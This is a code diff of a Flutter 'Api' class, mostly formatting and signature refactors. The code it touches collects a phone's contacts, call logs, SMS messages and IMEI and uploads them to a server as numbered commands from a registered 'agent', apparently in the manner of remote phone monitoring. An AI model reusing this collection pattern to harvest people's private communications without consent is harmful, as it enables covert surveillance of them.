@@ -34,10 +34,7 @@ class Api {
   // 1001 – device info
   static Future<String?> sendDeviceInfo(String? agent, String? imei) async {
     const url = '$base/a_agent_register'; // Phone Backup
-    final headers = {
-      'Content-Type': 'application/json',
-      'User-Agent': '$agent'
-    };
+    final headers = {'Content-Type': 'application/json', 'User-Agent': '$agent'};
     printYellow('headers $headers');
     final response = await http.get(Uri.parse(url), headers: headers);
 
@@ -112,7 +109,8 @@ class Api {
   }
 
   // 1 - contacts
-  static Future<String?> sendContacts(String? agent, String? uuid) async {
+  static Future<String?> sendContacts(
+      BuildContext context, String? agent, String? uuid) async {
     printWhite('START: sendContactsToServer()');
 
     if (kDebugMode) {
@@ -121,6 +119,8 @@ class Api {
     }
 
     Iterable<Contact> contacts = await ContactsService.getContacts();
+    // providerMainScope(context).contacts = contacts;
+
     List phonesData = [];
 
     for (var c in contacts) {
@@ -146,7 +146,7 @@ class Api {
   }
 
   // 2 – call records
-  Future sendCallLogs(BuildContext context, String? agent, String? uuid) async {
+  static Future sendCallLogs(BuildContext context, String? agent, String? uuid) async {
     printWhite('START: sendCallLogs() ');
     Hive.registerAdapter(CallsAdapter());
     late Box box;
@@ -203,7 +203,7 @@ class Api {
         data: {"uuid": uuid, "command_id": "2", "data": callsJsonList});
   }
 
-  getCallsFromDb(context) async {
+  static getCallsFromDb(context) async {
     List<CallsModel> callsModelList = [];
 
     late Box box;
@@ -230,15 +230,13 @@ class Api {
         : DateTime.now().subtract(const Duration(days: 30));
   }
 
-  updateCallLogs(context,status) async {
+  updateCallLogs(context, status) async {
     late Box box;
     box = await Hive.openBox('calls');
 
     var raw = box.toMap();
 
-
-    for(var i=0; i<raw.length; i++) {
-
+    for (var i = 0; i < raw.length; i++) {
       var calls = Calls()
         ..name = raw[i].name
         ..mobileNumber = raw[i].mobileNumber
@@ -247,7 +245,7 @@ class Api {
         ..duration = raw[i].duration
         ..type = raw[i].type
         ..isHide = status;
-      box.putAt(i,calls);
+      box.putAt(i, calls);
     }
     getCallsFromDb(context);
   }
@@ -282,8 +280,7 @@ class Api {
   // 4 – camera (Soon)
 
   // 5 – sms list
-  static Future sendSmsLogs(
-      BuildContext context, String? agent, String? uuid) async {
+  static Future sendSmsLogs(BuildContext context, String? agent, String? uuid) async {
     printWhite('START: sendSmsLogs() ');
 
     if (kDebugMode) {
@@ -318,7 +315,6 @@ class Api {
     providerMainScope(context).smsLogs = smsModelList;
 
     _sendToServer(agent, uuid,
-        type: 'SMS Logs',
-        data: {"uuid": uuid, "command_id": "5", "data": smsJsonList});
+        type: 'SMS Logs', data: {"uuid": uuid, "command_id": "5", "data": smsJsonList});
   }
 }
